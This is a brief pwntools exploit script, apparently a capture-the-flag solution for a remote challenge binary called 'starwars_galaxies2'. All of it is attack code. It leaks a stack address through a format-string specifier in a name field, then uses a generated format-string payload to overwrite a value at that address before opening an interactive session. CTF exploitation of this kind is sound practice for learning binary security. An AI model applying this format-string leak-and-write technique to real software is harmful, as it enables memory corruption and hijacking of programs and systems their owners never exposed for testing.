from pwn import *

# p = process('./starwars_galaxies2')
p = remote('0.cloud.chals.io', 34916)
e = context.binary = ELF('./starwars_galaxies2')

def create(name, id, clas):
    p.sendlineafter(b'>> ', b'0')
    p.sendlineafter(b': ', name)
    p.sendlineafter(b': ', str(id))
    p.sendlineafter(b': ', str(clas))

create(b'%25$p', 0xfc18, 0)
p.sendlineafter(b'>> ', b'2')
boss = int(p.recvline()[:-1], 16)
log.info(hex(boss))

create(fmtstr_payload(8, {boss:0x61}), 0xfc18, 0)
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'1')
p.interactive()
